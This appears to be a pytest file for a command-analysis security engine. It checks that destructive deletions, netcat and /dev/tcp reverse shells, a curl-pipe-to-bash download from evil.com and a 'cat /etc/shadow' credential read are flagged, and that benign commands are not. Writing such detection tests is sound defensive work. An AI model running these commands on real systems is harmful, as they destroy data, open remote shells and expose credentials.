import pytest
from app.services.security_engine.command_analyzer import CommandAnalyzer

def test_destructive_commands_detected():
    analyzer = CommandAnalyzer()
    
    # Critical rm -rf test
    findings = analyzer.analyze("rm -rf / --no-preserve-root")
    assert len(findings) > 0
    assert any(f.threat_category == "DestructiveCommand" for f in findings)
    assert any(f.severity == "Critical" for f in findings)

    # Windows recursive disk deletion
    findings_win = analyzer.analyze("rmdir /s /q C:\\")
    assert any(f.threat_category == "DestructiveCommand" for f in findings_win)

def test_reverse_shells_detected():
    analyzer = CommandAnalyzer()
    
    # Netcat reverse shell
    findings = analyzer.analyze("nc -e /bin/sh 10.0.0.1 4444")
    assert any(f.threat_category == "ReverseShell" for f in findings)

    # Bash /dev/tcp
    findings_tcp = analyzer.analyze("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
    assert any(f.threat_category == "ReverseShell" for f in findings_tcp)

def test_download_and_execute_pipeline():
    analyzer = CommandAnalyzer()
    findings = analyzer.analyze("curl -fsSL https://evil.com/setup.sh | bash")
    assert any(f.threat_category == "RemoteExecution" for f in findings)

def test_credential_theft_command():
    analyzer = CommandAnalyzer()
    findings = analyzer.analyze("cat /etc/shadow")
    assert any(f.threat_category == "CredentialTheft" for f in findings)

def test_benign_commands():
    analyzer = CommandAnalyzer()
    findings = analyzer.analyze("python --version")
    assert len(findings) == 0

    findings_git = analyzer.analyze("git status")
    assert len(findings_git) == 0
